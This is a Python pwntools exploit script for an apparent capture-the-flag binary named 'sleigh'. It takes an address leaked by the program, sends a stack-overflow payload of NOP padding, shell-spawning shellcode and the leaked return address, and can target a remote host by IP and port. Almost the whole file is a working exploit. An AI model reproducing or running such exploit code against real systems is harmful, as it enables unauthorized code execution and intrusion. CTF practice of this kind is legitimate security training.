#!/usr/bin/env python

from pwn import *

context.arch = "x86_64"
get_flag = False
chall_name = 'sleigh'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *repair+205''')

def get_leak(p_output):
    initial_position = p_output.find(b'h: [') + 4
    final_position = p_output.find(b'0]', initial_position) + 1
    libc_leak_bytes = p_output[initial_position:final_position]
    return p64(int(libc_leak_bytes, 16))

def run_exploit(p, debug):
    print(p.recv(timeout=2).decode())
    p.sendline(b'1')

    # getting leak of my output
    out = p.recv(timeout=5)
    leak = get_leak(out)

    if debug:
        run_with_gdb(p)

    # payloads
    #sc = b'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80'
    # sc = shellcraft.cat('flag')
    # Need to pop registers at the beginning to make room on stack

    # meu erro fooi nao criar espaco na stack?
    shellcode = asm(shellcraft.popad())
    # Build shellcode (cat flag.txt or spawn shell)
    shellcode += asm(shellcraft.sh())
    # Pad shellcode with NOPs until we get to return address
    padding = asm('nop') * (cyclic_find('jaaaaaaa', n=8) - len(shellcode))

    payload = padding + shellcode + leak

    p.sendline(payload)
    p.interactive()

if get_flag:
    p = remote('178.62.32.210', '30138')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)